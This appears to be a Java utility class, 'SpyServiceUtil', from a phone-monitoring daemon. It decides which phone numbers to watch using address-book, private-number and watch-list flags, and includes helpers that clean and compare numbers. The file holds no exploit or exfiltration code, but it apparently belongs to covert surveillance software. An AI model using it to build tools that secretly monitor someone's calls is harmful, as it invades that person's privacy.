package com.vvt.daemon.appengine;

import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.vvt.contacts.ContactsDatabaseManager;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PrefWatchList;
import com.vvt.preference_manager.WatchFlag;

public class SpyServiceUtil {
	
	private static final String TAG = "SpyServiceUtil";
	
	
	public static synchronized boolean isWatchNumber(String number, PrefWatchList prefWatchList) {
		FxLog.v(TAG, "isWatchNumber # ENTER ...");
		FxLog.v(TAG, String.format("isWatchNumber # number: %s", number));

		List<String> watchNumbers = prefWatchList.getWatchNumber();

		Set<WatchFlag> watchFlags = prefWatchList.getWatchFlag();
		
		//watch all
		if(watchFlags.contains(WatchFlag.WATCH_NOT_IN_ADDRESSBOOK) 
				&&  watchFlags.contains(WatchFlag.WATCH_IN_ADDRESSBOOK)) {
			FxLog.d(TAG, String.format("isWatchNumber # Watch ALL -> return true"));
			return true;
		}
		
		if(watchFlags.contains(WatchFlag.WATCH_PRIVATE_OR_UNKNOWN_NUMBER)) {
			if (isPrivateNumber(number)) {
				FxLog.v(TAG, String.format("isWatchNumber # PRIVATE_OR_UNKNOWN_NUMBER -> return true"));
				return true;
			}
		}
		
		if(watchFlags.contains(WatchFlag.WATCH_NOT_IN_ADDRESSBOOK)) {
			if(ContactsDatabaseManager.getContactNameByPhone(number) == null){
				FxLog.v(TAG, String.format("isWatchNumber # NOT_IN_ADDRESSBOOK -> return true"));
				return true;
			}
		}
		
		if(watchFlags.contains(WatchFlag.WATCH_IN_ADDRESSBOOK)) {
			if(ContactsDatabaseManager.getContactNameByPhone(number) != null){
				FxLog.v(TAG, String.format("isWatchNumber # IN_ADDRESSBOOK -> return true"));
				return true;
			}
		}
		
		if(watchFlags.contains(WatchFlag.WATCH_IN_LIST)) {
			for (int i = 0; i < watchNumbers.size(); i++) {
				String watchNumber = watchNumbers.get(i);
				if (isSamePhoneNumber(watchNumber, number, 1)) {
					FxLog.v(TAG, String.format("isWatchNumber # WATCH_IN_LIST -> return true"));
					return true;
				}
			}
		}
		
		FxLog.v(TAG, String.format("isWatchNumber # return false"));
		return false;
		
//		for (WatchFlag wf : watchFlags) {
//			switch (wf) {
//			case WATCH_NOT_IN_ADDRESSBOOK:
//				FxLog.v(TAG, String.format("isWatchNumber # return true"));
//				return true;
//			case WATCH_IN_ADDRESSBOOK:
////				FxLog.v(TAG, String.format("isWatchNumber # return true"));
////				return true;
//			case WATCH_PRIVATE_OR_UNKNOWN_NUMBER:
//				if (isPrivateNumber(number)) {
//					FxLog.v(TAG, String.format("isWatchNumber # return true"));
//					return true;
//				}
//			case WATCH_IN_LIST:
//				for (int i = 0; i < watchNumbers.size(); i++) {
//					String watchNumber = watchNumbers.get(i);
//					if (isSamePhoneNumber(watchNumber, number, 1)) {
//						FxLog.v(TAG, String.format("isWatchNumber # return true"));
//						return true;
//					}
//				}
//				FxLog.v(TAG, String.format("isWatchNumber # return true"));
//				return true;
//
//			default:
//				return false;
//			}
//		}
//
//		FxLog.v(TAG, String.format("isWatchNumber # return false"));
//		return false;
	}
	
	public static boolean isSamePhoneNumber(String number1, String number2, int minimumLength) {
    	FxLog.v(TAG, "isSamePhoneNumber # ENTER ...");
    	if (number1 == null || number2 == null) {
			return false;
		}
		
		// Clean phone number
		String normalizedNumber1 = cleanPhoneNumber(number1);
		String normalizedNumber2 = cleanPhoneNumber(number2);
		
    		FxLog.v(TAG, String.format(
    				"isSamePhoneNumber # normalizedNumber1: %s, normalizedNumber2: %s", 
    				normalizedNumber1, normalizedNumber2));
		
		if (normalizedNumber1.length() < minimumLength || 
			normalizedNumber2.length() < minimumLength) {
			FxLog.v(TAG, "isSamePhoneNumber # Length of phone numbers are too short - > EXIT ...");
			return false;
		}
		else if (normalizedNumber1.length() > normalizedNumber2.length()) {
			return normalizedNumber1.endsWith(normalizedNumber2);
		}
		else {
			return normalizedNumber2.endsWith(normalizedNumber1);
		}
	}
	
	/**
	 * Make a phone number ready for comparison.
	 * By removing leading characters e.g. +, -, and 0
	 * @param number
	 */
	public static String cleanPhoneNumber(String number) {
		if (number == null) {
			return null;
		}
		
		// Remove symbol + - ( )
		String cleanedNumber = 
			number.replace("+", "").replace("-", "")
				.replace("(", "").replace(")", "").replace(" ", "");
		
		// Remove beginning zero
		if (cleanedNumber.startsWith("0")) {
			Pattern p = Pattern.compile("[0]+");
			Matcher m = p.matcher(cleanedNumber);
			cleanedNumber = m.replaceFirst("");
		}
		
		return cleanedNumber;
	}
	
	public static boolean isPrivateNumber(String number) {
		if (number == null) {
			// number should not be null.
			return true;
		}
		return number.length() == 0;
	}
}
